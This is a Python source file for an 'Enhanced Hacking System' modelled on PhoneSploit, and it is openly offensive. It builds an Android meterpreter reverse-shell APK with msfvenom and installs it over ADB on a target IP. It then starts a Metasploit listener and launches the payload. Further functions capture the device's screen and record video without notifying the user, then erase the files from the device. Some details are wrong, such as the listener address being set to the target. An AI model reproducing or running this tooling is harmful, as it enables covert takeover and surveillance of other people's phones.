"""
Enhanced Hacking System
Provides advanced hacking features from PhoneSploit
"""

import asyncio
import json
import logging
import os
import subprocess
import time
from typing import Dict, List, Optional
from datetime import datetime

class EnhancedHackingSystem:
    """Enhanced hacking system for PhoneSploit features"""
    
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        self.adb_path = "adb"
        self.current_device = None
        self.hacking_history = []
        self.metasploit_available = False
        
        # Check for Metasploit availability
        self._check_metasploit_availability()
    
    def _check_metasploit_availability(self):
        """Check if Metasploit is available"""
        try:
            result = subprocess.run(["msfvenom", "--version"], 
                                  capture_output=True, text=True, timeout=5)
            self.metasploit_available = result.returncode == 0
            self.logger.info(f"Metasploit available: {self.metasploit_available}")
        except Exception as e:
            self.logger.warning(f"Metasploit not available: {str(e)}")
            self.metasploit_available = False
    
    async def hack_device_complete(self, target_ip: str, payload_type: str = "android/meterpreter/reverse_tcp") -> Dict:
        """Complete device hacking with Metasploit"""
        try:
            if not self.metasploit_available:
                return {
                    "success": False,
                    "error": "Metasploit not available"
                }
            
            self.logger.info(f"Starting complete hack on {target_ip}")
            
            # Step 1: Generate payload
            payload_result = await self._generate_metasploit_payload(target_ip, payload_type)
            if not payload_result["success"]:
                return payload_result
            
            payload_path = payload_result["payload_path"]
            
            # Step 2: Install payload on device
            install_result = await self._install_payload_on_device(payload_path, target_ip)
            if not install_result["success"]:
                return install_result
            
            # Step 3: Start Metasploit listener
            listener_result = await self._start_metasploit_listener(target_ip)
            if not listener_result["success"]:
                return listener_result
            
            # Step 4: Execute payload
            execute_result = await self._execute_payload_on_device(target_ip)
            if not execute_result["success"]:
                return execute_result
            
            return {
                "success": True,
                "target_ip": target_ip,
                "payload_type": payload_type,
                "payload_path": payload_path,
                "message": "Complete device hack initiated successfully",
                "steps": [
                    "Payload generated",
                    "Payload installed",
                    "Listener started",
                    "Payload executed"
                ]
            }
                
        except Exception as e:
            self.logger.error(f"Error in complete device hack: {str(e)}")
            return {
                "success": False,
                "error": str(e)
            }
    
    async def _generate_metasploit_payload(self, target_ip: str, payload_type: str) -> Dict:
        """Generate Metasploit payload"""
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            payload_name = f"payload_{timestamp}.apk"
            
            # Generate payload using msfvenom
            msfvenom_command = [
                "msfvenom",
                "-p", payload_type,
                f"LHOST={target_ip}",
                "LPORT=4444",
                "-o", payload_name,
                "--platform", "android",
                "-a", "dalvik",
                "--encoder", "x86/shikata_ga_nai",
                "-i", "3"
            ]
            
            result = subprocess.run(
                msfvenom_command,
                capture_output=True,
                text=True,
                timeout=60
            )
            
            if result.returncode == 0 and os.path.exists(payload_name):
                return {
                    "success": True,
                    "payload_path": payload_name,
                    "message": "Payload generated successfully"
                }
            else:
                return {
                    "success": False,
                    "error": "Failed to generate payload",
                    "message": result.stderr
                }
                
        except Exception as e:
            self.logger.error(f"Error generating payload: {str(e)}")
            return {
                "success": False,
                "error": str(e)
            }
    
    async def _install_payload_on_device(self, payload_path: str, target_ip: str) -> Dict:
        """Install payload on target device"""
        try:
            # Connect to device
            connect_result = await self._execute_adb_command(f"connect {target_ip}:5555")
            
            if "connected" in connect_result.lower():
                # Install payload
                install_result = await self._execute_adb_command(f"install {payload_path}")
                
                if "Success" in install_result:
                    return {
                        "success": True,
                        "payload_path": payload_path,
                        "target_ip": target_ip,
                        "message": "Payload installed successfully"
                    }
                else:
                    return {
                        "success": False,
                        "error": "Failed to install payload",
                        "message": install_result
                    }
            else:
                return {
                    "success": False,
                    "error": "Failed to connect to device",
                    "message": connect_result
                }
                
        except Exception as e:
            self.logger.error(f"Error installing payload: {str(e)}")
            return {
                "success": False,
                "error": str(e)
            }
    
    async def _start_metasploit_listener(self, target_ip: str) -> Dict:
        """Start Metasploit listener"""
        try:
            # Create Metasploit resource file
            resource_content = f"""
use exploit/multi/handler
set PAYLOAD android/meterpreter/reverse_tcp
set LHOST {target_ip}
set LPORT 4444
set ExitOnSession false
exploit -j
"""
            
            resource_file = f"listener_{int(time.time())}.rc"
            with open(resource_file, 'w') as f:
                f.write(resource_content)
            
            # Start Metasploit listener in background
            msfconsole_command = f"msfconsole -r {resource_file}"
            
            process = subprocess.Popen(
                msfconsole_command.split(),
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            # Wait a moment for listener to start
            await asyncio.sleep(3)
            
            return {
                "success": True,
                "resource_file": resource_file,
                "process_id": process.pid,
                "message": "Metasploit listener started successfully"
            }
                
        except Exception as e:
            self.logger.error(f"Error starting Metasploit listener: {str(e)}")
            return {
                "success": False,
                "error": str(e)
            }
    
    async def _execute_payload_on_device(self, target_ip: str) -> Dict:
        """Execute payload on device"""
        try:
            # Launch the payload app
            launch_command = "shell am start -n com.metasploit.stage/.MainActivity"
            result = await self._execute_adb_command(launch_command)
            
            return {
                "success": True,
                "target_ip": target_ip,
                "message": "Payload executed successfully"
            }
                
        except Exception as e:
            self.logger.error(f"Error executing payload: {str(e)}")
            return {
                "success": False,
                "error": str(e)
            }
    
    async def take_anonymous_screenshot(self, save_path: str = None) -> Dict:
        """Take anonymous screenshot"""
        try:
            if not self.current_device:
                return {
                    "success": False,
                    "error": "No device connected"
                }
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"anonymous_screenshot_{timestamp}.png"
            
            if save_path:
                filename = os.path.join(save_path, filename)
            
            # Take screenshot without user notification
            result = await self._execute_adb_command(f"shell screencap -p /sdcard/{filename}")
            
            # Pull screenshot to local machine
            pull_result = await self._execute_adb_command(f"pull /sdcard/{filename} {filename}")
            
            # Remove from device
            await self._execute_adb_command(f"shell rm /sdcard/{filename}")
            
            if os.path.exists(filename):
                return {
                    "success": True,
                    "filename": filename,
                    "path": os.path.abspath(filename),
                    "message": "Anonymous screenshot captured successfully"
                }
            else:
                return {
                    "success": False,
                    "error": "Failed to save anonymous screenshot"
                }
                
        except Exception as e:
            self.logger.error(f"Error taking anonymous screenshot: {str(e)}")
            return {
                "success": False,
                "error": str(e)
            }
    
    async def record_anonymous_screen(self, duration: int = 10, save_path: str = None) -> Dict:
        """Record screen anonymously"""
        try:
            if not self.current_device:
                return {
                    "success": False,
                    "error": "No device connected"
                }
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"anonymous_screenrecord_{timestamp}.mp4"
            
            if save_path:
                filename = os.path.join(save_path, filename)
            
            # Start screen recording without user notification
            record_command = f"shell screenrecord --time-limit={duration} /sdcard/{filename}"
            result = await self._execute_adb_command(record_command)
            
            # Wait for recording to complete
            await asyncio.sleep(duration + 2)
            
            # Pull recording to local machine
            pull_result = await self._execute_adb_command(f"pull /sdcard/{filename} {filename}")
            
            # Remove from device
            await self._execute_adb_command(f"shell rm /sdcard/{filename}")
            
            if os.path.exists(filename):
                return {
                    "success": True,
                    "filename": filename,
                    "path": os.path.abspath(filename),
                    "duration": duration,
                    "message": "Anonymous screen recording completed"
                }
            else:
                return {
                    "success": False,
                    "error": "Failed to save anonymous screen recording"
                }
                
        except Exception as e:
            self.logger.error(f"Error recording anonymous screen: {str(e)}")
            return {
                "success": False,
                "error": str(e)
            }
    
    async def get_ip_address(self) -> Dict:
        """Get IP address of connected device"""
        try:
            if not self.current_device:
                return {
                    "success": False,
                    "error": "No device connected"
                }
            
            # Get device IP address
            ip_command = "shell ip addr show wlan0"
            result = await self._execute_adb_command(ip_command)
            
            # Parse IP address from result
            lines = result.strip().split('\n')
            ip_address = None
            
            for line in lines:
                if "inet " in line and "wlan0" in line:
                    ip_parts = line.strip().split()
                    for part in ip_parts:
                        if part.startswith("192.168.") or part.startswith("10.") or part.startswith("172."):
                            ip_address = part.split('/')[0]
                            break
            
            if ip_address:
                return {
                    "success": True,
                    "ip_address": ip_address,
                    "message": "IP address retrieved successfully"
                }
            else:
                return {
                    "success": False,
                    "error": "Could not determine IP address"
                }
                
        except Exception as e:
            self.logger.error(f"Error getting IP address: {str(e)}")
            return {
                "success": False,
                "error": str(e)
            }
    
    async def _execute_adb_command(self, command: str) -> str:
        """Execute ADB command"""
        try:
            full_command = f"{self.adb_path} {command}"
            self.logger.debug(f"Executing: {full_command}")
            
            result = subprocess.run(
                full_command.split(),
                capture_output=True,
                text=True,
                timeout=30
            )
            
            # Log hacking in history
            self.hacking_history.append({
                "command": full_command,
                "timestamp": datetime.now().isoformat(),
                "return_code": result.returncode,
                "stdout": result.stdout,
                "stderr": result.stderr
            })
            
            if result.returncode == 0:
                return result.stdout
            else:
                self.logger.error(f"ADB command failed: {result.stderr}")
                return result.stderr
                
        except subprocess.TimeoutExpired:
            self.logger.error(f"ADB command timed out: {command}")
            return "Command timed out"
        except Exception as e:
            self.logger.error(f"Error executing ADB command: {str(e)}")
            return str(e)
    
    def get_hacking_history(self) -> List[Dict]:
        """Get hacking history"""
        return self.hacking_history
    
    def clear_hacking_history(self):
        """Clear hacking history"""
        self.hacking_history.clear()
        self.logger.info("Hacking history cleared")
    
    def get_hacking_statistics(self) -> Dict:
        """Get hacking statistics"""
        total_operations = len(self.hacking_history)
        successful_operations = len([op for op in self.hacking_history if op["return_code"] == 0])
        failed_operations = total_operations - successful_operations
        
        return {
            "total_operations": total_operations,
            "successful_operations": successful_operations,
            "failed_operations": failed_operations,
            "success_rate": (successful_operations / total_operations * 100) if total_operations > 0 else 0,
            "metasploit_available": self.metasploit_available
        }
    
    def get_system_requirements_status(self) -> Dict:
        """Get system requirements status for hacking"""
        return {
            "metasploit_available": self.metasploit_available,
            "adb_available": self._check_adb_availability(),
            "nmap_available": self._check_nmap_availability(),
            "scrcpy_available": self._check_scrcpy_availability()
        }
    
    def _check_adb_availability(self) -> bool:
        """Check if ADB is available"""
        try:
            result = subprocess.run([self.adb_path, "version"], 
                                  capture_output=True, text=True, timeout=5)
            return result.returncode == 0
        except Exception:
            return False
    
    def _check_nmap_availability(self) -> bool:
        """Check if Nmap is available"""
        try:
            result = subprocess.run(["nmap", "--version"], 
                                  capture_output=True, text=True, timeout=5)
            return result.returncode == 0
        except Exception:
            return False
    
    def _check_scrcpy_availability(self) -> bool:
        """Check if Scrcpy is available"""
        try:
            result = subprocess.run(["scrcpy", "--version"], 
                                  capture_output=True, text=True, timeout=5)
            return result.returncode == 0
        except Exception:
            return False